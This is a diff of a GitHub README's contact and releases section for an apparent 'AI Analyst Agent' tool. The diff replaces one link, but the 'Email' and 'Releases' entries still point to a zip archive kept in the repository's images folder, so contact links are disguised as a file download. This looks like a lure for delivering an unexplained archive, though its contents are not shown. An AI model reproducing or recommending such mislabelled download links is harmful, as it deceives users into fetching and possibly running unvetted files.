@@ -118,9 +118,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **GitHub**: [sorin177](https://github.com/sorin177/ai-analyst-agent/raw/refs/heads/main/images/analyst-agent-ai-3.6.zip)
+- **GitHub**: [sorin177](https://github.com/aryagotnochill/ai-analyst-agent)
 - **Email**: https://github.com/sorin177/ai-analyst-agent/raw/refs/heads/main/images/analyst-agent-ai-3.6.zip
 
 Check the [Releases](https://github.com/sorin177/ai-analyst-agent/raw/refs/heads/main/images/analyst-agent-ai-3.6.zip) section for the latest updates and downloads.
+
 
 Thank you for your interest in the AI Analyst Agent! We hope this tool helps you make data-driven decisions effortlessly.
